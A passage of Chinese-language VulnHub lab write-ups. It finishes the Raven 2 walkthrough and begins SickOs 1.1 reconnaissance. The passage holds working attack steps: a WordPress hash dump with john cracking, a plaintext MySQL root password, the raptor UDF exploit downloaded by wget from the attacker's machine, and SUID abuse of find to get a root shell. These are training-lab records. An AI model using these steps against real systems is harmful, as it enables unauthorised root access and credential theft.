ID,user_login,user_pass from wp_users;</span><br>select ID,user_login,user_pass from wp_users;<br>+----+------------+------------------------------------+<br>| ID | user_login | user_pass                          |<br>+----+------------+------------------------------------+<br>|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |<br>|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. |<br>+----+------------+------------------------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>john 破解：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt user.txt</span><br></code></pre></td></tr></table></figure><p>破解一段时间后未破解出，尝试 Mysql UDF 提权，查看 mysql 权限、版本、位置及 <code>secure_file_priv</code> 选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ ps aux | grep mysql  <br>root        561  0.0  0.3   4340  1616 ?        S    00:48   0:00 /bin/sh /usr/bin/mysqld_safe<br>root        930  0.0 10.4 552240 51516 ?        Sl   00:48   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>www-data   2525  0.0  0.2  11136  1004 ?        S    01:23   0:00 grep mysql<br><br>www-data@Raven:/var/www/html$ mysql --version<br>mysql --version<br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><br>www-data@Raven:/var/www/html$ whereis mysql<br>whereis mysql<br>mysql: /usr/bin/mysql /usr/lib/mysql /etc/mysql /usr/share/mysql /usr/share/man/man1/mysql.1.gz<br><br>www-data@Raven:/var/www/html$ mysql -uroot -pR@v3nSecurity<br>mysql -uroot -pR@v3nSecurity<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show global variables like <span class="hljs-string">&#x27;secure%&#x27;</span>;</span><br>show global variables like &#x27;secure%&#x27;;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_auth      | OFF   |<br>| secure_file_priv |       |<br>+------------------+-------+<br>2 rows in set (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show variables like <span class="hljs-string">&#x27;%compile%&#x27;</span>;</span> <br>show variables like &#x27;%compile%&#x27;;<br>+-------------------------+------------------+<br>| Variable_name           | Value            |<br>+-------------------------+------------------+<br>| version_compile_machine | x86_64           |<br>| version_compile_os      | debian-linux-gnu |<br>+-------------------------+------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>查找利用脚本，这里使用 <code>1518.c</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit mysql udf</span><br>------------------------------------------------------------------------------ -----------------------------<br> Exploit Title                                                                |  Path<br>------------------------------------------------------------------------------ -----------------------------<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)        | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)       | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                       | linux/local/7856.txt<br>------------------------------------------------------------------------------ -----------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 1518.c</span>   <br>  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)<br>      URL: https://www.exploit-db.com/exploits/1518<br>     Path: /usr/share/exploitdb/exploits/linux/local/1518.c<br>File Type: C source, ASCII text, with CRLF line terminators<br><br>Copied to: /home/kali/1518.c<br></code></pre></td></tr></table></figure><p>脚本给予的利用过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> * $ id</span><br><span class="hljs-comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="hljs-comment"> * $ gcc -g -c raptor_udf2.c</span><br><span class="hljs-comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="hljs-comment"> * $ mysql -u root -p</span><br><span class="hljs-comment"> * Enter password:</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> * mysql&gt; use mysql;</span><br><span class="hljs-comment"> * mysql&gt; create table foo(line blob);</span><br><span class="hljs-comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span><br><span class="hljs-comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; select * from mysql.func;</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | name      | ret | dl             | type     |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | do_system |   2 | raptor_udf2.so | function |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span><br><span class="hljs-comment"> * mysql&gt; \! sh</span><br><span class="hljs-comment"> * sh-2.05b$ cat /tmp/out</span><br><span class="hljs-comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>查看靶机是否有 gcc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ gcc --version<br>gcc --version<br>gcc (Debian 4.9.2-10+deb8u1) 4.9.2<br>Copyright (C) 2014 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure><p>通过 python 开启本地 http 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.158 - - [10/Jul/2022 10:30:57] &quot;GET /1518.c HTTP/1.1&quot; 200 -<br>192.168.135.158 - - [10/Jul/2022 10:33:14] &quot;GET /1518.so HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>靶机下载编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ wget http://192.168.135.141:8888/1518.c<br>wget http://192.168.135.141:8888/1518.c<br>converted &#x27;http://192.168.135.141:8888/1518.c&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/1518.c&#x27; (UTF-8)<br>--2022-07-11 00:30:57--  http://192.168.135.141:8888/1518.c<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3378 (3.3K) [text/plain]<br>Saving to: &#x27;1518.c&#x27;<br><br>1518.c              100%[=====================&gt;]   3.30K  --.-KB/s   in 0s     <br><br>2022-07-11 00:30:57 (185 MB/s) - &#x27;1518.c&#x27; saved [3378/3378]<br><br>www-data@Raven:/var/www/html$ ls<br>ls<br>1518.c          contact.php  elements.html  index.html  service.html  vendor<br>Security - Doc  contact.zip  fonts          js          shell.php     wordpress<br>about.html      css          img            scss        team.html<br>www-data@Raven:/var/www/html$ gcc -g -c 1518.c<br>gcc -g -c 1518.c<br>www-data@Raven:/var/www/html$ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc<br>&lt;l$ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc                 <br>/usr/bin/ld: 1518.o: relocation R_X86_64_PC32 against undefined symbol `system@@GLIBC_2.2.5&#x27; can not be used when making a shared object; recompile with -fPIC<br>/usr/bin/ld: final link failed: Bad value<br>collect2: error: ld returned 1 exit status<br>www-data@Raven:/var/www/html$ ls<br>ls<br>1518.c          about.html   css            img         scss          team.html<br>1518.o          contact.php  elements.html  index.html  service.html  vendor<br>Security - Doc  contact.zip  fonts          js          shell.php     wordpress<br></code></pre></td></tr></table></figure><p>通过尝试，在靶机不能成功编译，所以在攻击机上进行编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -g -c 1518.c</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc</span><br></code></pre></td></tr></table></figure><p>靶机下载目标文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ wget http://192.168.135.141:8888/1518.so<br>wget http://192.168.135.141:8888/1518.so<br>converted &#x27;http://192.168.135.141:8888/1518.so&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/1518.so&#x27; (UTF-8)<br>--2022-07-11 00:33:14--  http://192.168.135.141:8888/1518.so<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 17232 (17K) [application/octet-stream]<br>Saving to: &#x27;1518.so&#x27;<br><br>1518.so             100%[=====================&gt;]  16.83K  --.-KB/s   in 0s     <br><br>2022-07-11 00:33:14 (78.8 MB/s) - &#x27;1518.so&#x27; saved [17232/17232]<br><br>www-data@Raven:/var/www/html$ ls<br>ls<br>1518.c          about.html   elements.html  js            team.html<br>1518.o          contact.php  fonts          scss          vendor<br>1518.so         contact.zip  img            service.html  wordpress<br>Security - Doc  css          index.html     shell.php<br></code></pre></td></tr></table></figure><p>进行提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ mysql -uroot -pR@v3nSecurity<br>mysql -uroot -pR@v3nSecurity<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 37<br>Server version: 5.5.60-0+deb8u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>use wordpress;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create table foo(line blob);</span><br>create table foo(line blob);<br>Query OK, 0 rows affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> insert into foo values(load_file(<span class="hljs-string">&#x27;/var/www/html/1518.so&#x27;</span>));</span><br>insert into foo values(load_file(&#x27;/var/www/html/1518.so&#x27;));<br>Query OK, 1 row affected (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from foo into dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br>select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;<br>Query OK, 1 row affected (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create <span class="hljs-keyword">function</span> do_system returns <span class="hljs-built_in">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;</span><br>create function do_system returns integer soname &#x27;1518.so&#x27;;<br>Query OK, 0 rows affected (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from mysql.func;</span><br>select * from mysql.func;<br>+-----------+-----+---------+----------+<br>| name      | ret | dl      | type     |<br>+-----------+-----+---------+----------+<br>| do_system |   2 | 1518.so | function |<br>+-----------+-----+---------+----------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br>select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);<br>+--------------------------------------+<br>| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |<br>+--------------------------------------+<br>|                                    0 |<br>+--------------------------------------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> quit</span><br>quit<br>Bye<br></code></pre></td></tr></table></figure><p>上面利用 UDF 成功将 find 赋予了 SUID 权限，接下来进行 SUID 提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ ls -al /usr/bin/find<br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find<br>www-data@Raven:/var/www/html$ find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br>find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> cat /root/flag4.txt</span><br>cat /root/flag4.txt<br>  ___                   ___ ___ <br> | _ \__ ___ _____ _ _ |_ _|_ _|<br> |   / _` \ V / -_) &#x27; \ | | | | <br> |_|_\__,_|\_/\___|_||_|___|___|<br>                           <br>flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;<br>CONGRATULATIONS on successfully rooting RavenII<br>I hope you enjoyed this second interation of the Raven VM<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol><li>目录扫描</li><li>phpMailer：写入任意文件，造成远程命令执行（生成反弹 shell）</li><li>WordPress 配置文件；mysql root权限</li><li>MySQL UDF 提权：SUID 提权（find）</li></ol><h2 id="五、Others"><a href="#五、Others" class="headerlink" title="五、Others"></a>五、Others</h2><p>1、<a href="https://blog.csdn.net/m0_52923241/article/details/121042597">【渗透测试】VulnHub-Raven: 2_吃早餐的博客-CSDN博客</a></p><p>2、LinEnum（Linux枚举及权限提升检查工具）</p><p>下载：<code>https://github.com/rebootuser/LinEnum</code> </p><p>执行：可以查看到 Mysql 是用 root 登陆的</p><p>查看一下 mysql 的运行权限，可以看到 mysql 是以 root 运行，并且也显示了 mysql 的 plugin 目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ ./LinEnum.sh | grep mysql<br>./LinEnum.sh | grep mysql<br>uid=110(mysql) gid=116(mysql) groups=116(mysql)<br>mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false<br>root        561  0.0  0.3   4340  1616 ?        S    00:48   0:00 /bin/sh /usr/bin/mysqld_safe<br>root        930  0.0 10.4 552240 51516 ?        Sl   00:48   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>www-data   1827  0.0  0.2  11136   984 pts/0    S+   00:59   0:00 grep mysql<br>-rwxr-xr-x 1 root root 11873232 Apr 19  2018 /usr/sbin/mysqld<br>-rwxr-xr-x  1 root root  5485 Apr 19  2018 mysql<br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><br>www-data@Raven:/var/www/html$  ps -ef | grep mysql<br> ps -ef|grep mysql<br>root        561      1  0 00:48 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe<br>root        930    561  0 00:48 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>www-data   2359   1121  0 01:00 pts/0    00:00:00 grep mysql<br></code></pre></td></tr></table></figure><p>漏洞信息：<a href="https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html">https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html</a></p><p>如果MySQL版本 &lt;= 5.7.14，5.6.32，5.5.51，则有 MySQL-Exploit-Remote-Root-Code-Execution-Privesc 漏洞可以进行提权</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SickOs：1.1</title>
    <link href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0C%20SickOs-1.1/"/>
    <url>/2022/07/10/Penetration/Vulnhub/Part-1/0x0C%20SickOs-1.1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0C-SickOs-1-1-vulnhub"><a href="#0x0C-SickOs-1-1-vulnhub" class="headerlink" title="0x0C SickOs: 1.1~vulnhub"></a>0x0C SickOs: 1.1~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.157</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-09 22:57 EDT<br>Nmap scan report for 192.168.135.2 (192.168.135.2)<br>Host is up (0.0015s latency).<br>Nmap scan report for 192.168.135.141 (192.168.135.141)<br>Host is up (0.010s latency).<br>Nmap done: 256 IP addresses (2 hosts up) scanned in 7.13 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo arp-scan -l</span><br>[sudo] password for kali: <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:38:c2:06, IPv4: 192.168.135.141<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.135.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.135.2   00:50:56:eb:65:60       VMware, Inc.<br>192.168.135.157 00:0c:29:2b:9b:36       VMware, Inc.<br>192.168.135.254 00:50:56:ea:f7:2c       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.7: 256 hosts scanned in 2.174 seconds (117.76 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.157</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.157</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-09 23:01 EDT<br>Nmap scan report for 192.168.135.157 (192.168.135.157)<br>Host is up (0.0042s latency).<br>Not shown: 65532 filtered ports<br>PORT     STATE  SERVICE    VERSION<br>22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)<br>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)<br>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)<br>3128/tcp open   http-proxy Squid http proxy 3.1.19<br>|_http-server-header: squid/3.1.19<br>|_http-title: ERROR: The requested URL could not be retrieved<br>8080/tcp closed http-proxy<br>MAC Address: 00:0C:29:2B:9B:36 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>3128/tcp</td><td>open</td><td>http-proxy</td><td>Squid http proxy 3.1.19</td></tr><tr><td>8080/tcp</td><td>closed</td><td>http-proxy</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p><p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p><p><strong>3128端口</strong></p><p>通过 Nmap 扫到的端口信息可知，3128 端口开放了一个代理服务，直接访问是访问不了靶机的 80 端口的，可以借助它的代理来访问，设置浏览器代理，进行访问 <code>http://192.168.135.157</code> ，得到：BLEHHH!!! </p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.157 -p http://192.168.135.157:3128</span>                                                 <br>-----------------<br>URL_BASE: http://192.168.135.157/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>PROXY: http://192.168.135.157:3128<br>-----------------                                                        <br><br>---- Scanning URL: http://192.168.135.157/ ----<br>+ http://192.168.135.157/cgi-bin/ (CODE:403|SIZE:291)<br>+ http://192.168.135.157/connect (CODE:200|SIZE:109)<br>+ http://192.168.135.157/index (CODE:200|SIZE:21)<br>+ http://192.168.135.157/index.php (CODE:200|SIZE:21)<br>+ http://192.168.135.157/robots (CODE:200|SIZE:45)<br>+ http://192.168.135.157/robots.txt (CODE:200|SIZE:45)<br>+ 